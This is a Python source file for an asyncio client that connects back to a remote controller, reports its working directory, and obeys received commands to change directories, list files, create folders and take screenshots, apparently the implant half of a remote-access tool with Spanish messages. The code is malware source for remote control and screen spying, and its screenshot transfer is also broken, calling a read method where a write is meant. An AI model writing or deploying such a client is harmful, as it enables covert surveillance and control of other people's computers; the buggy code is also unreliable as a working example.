import socket
import sys
import os
import asyncio
import base64
import mss
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)

from crypto.aes_encryptor import AESEncryptor
from commands.crocodilec import crocodile

class AsyncClient:
    def __init__(self, host='127.0.0.1', port=65432):
        self.host = host
        self.port = port
        self.commands = crocodile()

    async def connect(self):
        reader, writer = await asyncio.open_connection(self.host, self.port)
        current_dir = os.getcwd()
        res_dir = current_dir.encode("utf-8")
        print(res_dir)
        writer.write(res_dir)  
        while True:
            try:
                data = await reader.read(1024)
                command = data.decode()
                print(f"Comando recibido: {command}")
                if command.startswith("cd "):
                    path = command[3:]
                    if os.path.exists(path) and os.path.isdir(path):
                        os.chdir(path)
                        current_dir = os.getcwd()     
                        writer.write(current_dir.encode('utf-8'))
                        await writer.drain()  # Enviar los datos
                        print(current_dir)
                elif command.startswith("ls") or command.startswith("dir"):
                        path = os.getcwd() 
                        dir_list = ""
                        p =  os.listdir(path) 
                        if p != []:               
                            for command in os.listdir(path):
                                if command != 0:
                                    dir_list += command + '\n'
                        else:
                            dir_list = "No Result."
                        writer.write(dir_list.encode('utf-8'))
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                elif command.startswith("mkdir"):
                    try:
                        os.makedirs(command[6:])                        
                        writer.write(b"Archive create with success")
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                    except FileExistsError:
                        pass
                elif command.startswith("capture"):
                    try:
                        self.captura_pantalla()
                        with open('monitor-1.png','rb') as file_send:
                            await reader.read(base64.b64encode(file_send.read()))
                        os.remove("monitor-1.png")
                        writer.write(b"Capture with success")
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                    except:
                        await reader.read(base64.b64encode("fail"))
                        writer.write(b"Fail")
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                else:
                     writer.write(b"Comando incorrecto.")

            except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                            print("Cliente desconectado de forma inesperada.")
                            break
            except Exception as e:
                print(f"Error en el shell: {e}")
                break  

    def captura_pantalla(self):
        screen = mss.mss()
        screen.shot()

if __name__ == "__main__":
    client = AsyncClient()
    asyncio.run(client.connect())
